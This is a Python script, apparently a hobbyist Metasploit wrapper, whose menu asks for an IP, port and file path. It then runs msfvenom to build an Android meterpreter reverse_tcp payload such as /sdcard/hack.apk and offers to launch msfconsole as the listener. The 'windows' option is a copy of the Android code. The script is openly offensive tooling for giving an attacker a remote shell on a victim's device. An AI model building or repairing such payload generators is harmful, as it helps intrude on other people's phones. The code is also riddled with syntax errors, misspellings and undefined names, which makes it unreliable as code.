#!/usr/bin/python3
# by : arief isal
# youtobe arief isal


import os
import random
import time


def logo():
print '\33[0;32m $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$$$$$_$$$$$$$$$$$$$$$$_$$$$$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$$$$$__$$$$$$$$$$$$$$_$$$$$$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$$$$$$_______________$$$$$$$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$$$$___________________$$$$$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$$____$$$_________$$$____$$$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$_____$$$_________$$$_____$$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$___________________________$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$___________________________$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'
print '\33[0;32m $$$$_____$$$____________________________$$$____$$$'
print '\33[0;32m $$$$_____$$$____________________________$$______$$'
print '\33[0;32m $$$$_____$$$____________________________$$______$$'
print '\33[0;32m $$$$_____$$$____________________________$$______$$'
print '\33[0;32m $$$$_____$$$____________________________$$______$$'
print '\33[0;32m $$$$_____$$$____________________________$$______$$'
print '\33[0;32m $$$$_____$$$____________________________$$______$$'
print '\33[0;32m $$$$______$$____________________________$$______$$'
print '\33[0;32m $$$$_____$$$____________________________$$______$$'
print '\33[0;32m $$$$$___$$$$____________________________$$$___$$$$'
print '\33[0;32m $$$$$$$$$$$$____________________________$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$____________________________$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$___________________________$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$$$$$______$$$$$$_____$$$$$$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$$$$$______$$$$$$_____$$$$$$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$$$$$______$$$$$$_____$$$$$$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$$$$$______$$$$$$_____$$$$$$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$$$$$______$$$$$$_____$$$$$$$$$$$$$$$$'
print '\33[0;32m $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'
print '\33[0;32mBy \33[31;1mArief \33[0;36mIsal'

def android():
    pt()
    print '\33[33;1m 'IP LOKAL'
    pt()
    ip = raw_input ' [ip] Addreess = '
    pt()
    print '\33[33;1m ' port = 4444'
    pt()
    port = raw_input ' [port] Number = '
    print ''
    print 'path && Name = /sdcard/hack.apk'
    pt()
    pay = raw_input ' [path] Name = '
    pt()
    print '\33[33;1m installing payload........'
    pt()
    os.system['msfvenom -p android/meterpteter/revesrse_tcp LHOST=' + ip + 'LPORT=' + por + ' R > ' + pay]'
    print ''
    print '\33[33;1m succesfully '
    print ''
    yan = raw_input ' Are You want to start listner (n/y) ')
    if yan == 'y':
        print ''
        print '............................................................'
        print '\33[33;1m msfconsole'
        print '\33[33;1mmulti handler'
        print '\33[33;1m set payload android/meterpreter/reverse_tcp'
        print '\33[33;1m set LHOST = LOKAL IP 'format ip'
        print '\33[33;1m set LPORT = format port'
        print 'Exploit'
        print ''
        print '.............................................................'
        print 'PLEASE WAIT MSFCONSOLE STARTING....'
        os.system('service postgresql start')
        os.system('msfconsole')
        menu()
    else:
        menu()

def windows():
    pt()
    print '\33[33;1m 'IP LOKAL'
    pt()
    ip = raw_input ' [ip] Addreess = '
    pt()
    print '\33[33;1m ' port = 4444'
    pt()
    port = raw_input ' [port] Number = '
    print ''
    print 'path && Name = /sdcard/hack.apk'
    pt()
    pay = raw_input ' [path] Name = '
    pt()
    print '\33[33;1m installing payload........'
    pt()
    os.system['msfvenom -p android/meterpteter/revesrse_tcp LHOST=' + ip + 'LPORT=' + por + ' R > ' + pay]
    print ''
    print '\33[33;1m succesfully '
    print ''
    yan = raw_input ' Are You want to start listner (n/y) ')
    if yan == 'y':
        print ''
        print '............................................................'
        print '\33[33;1m msfconsole'
        print '\33[33;1mmulti handler'
        print '\33[33;1m set payload android/meterpreter/reverse_tcp'
        print '\33[33;1m set LHOST = LOKAL IP 'format ip'
        print '\33[33;1m set LPORT = format port'
        print 'Exploit'
        print ''
        print '.............................................................'
        print 'PLEASE WAIT MSFCONSOLE STARTING....'
        os.system('service postgresql start')
        os.system('msfconsole')
        menu()
    else:
        menu()

def menu():
    os.system('clear')
    print '\33[33;1m '
    logo()
    pt()
    print '\33[33;1m <<---------------[ PAYLOAD MENU ]---------------->> 
    pt()
    print ('1') 'android'
    pt()
    print ('2') 'windows'
    pt() 
    print
    pt() 
    op = raw_input 'select'
    if op == '1':
        os.system('clear')
        pt()
        android()
    elif op == '2':
        os.system('clear')
        pt()
        windows()
     elif op == 'l':
        pt()
        os.system('msfvenom -l')
        pt()
        again()
    elif op == 'h':
        pt()
        print cyan + '   <<<   msfvenom help   >>>'
        print green
        os.system('msfvenom -h')
        pt()
        print cyan + '   <<<   msfconsole help   >>>'
        print green
        os.system('msfconsole -h')
        pt()
        again()
    elif op == 'a':
        auth()
    elif op == 'e':
        print '\x1b[1;92m Exiting......'
    else:
        again()

menu() 
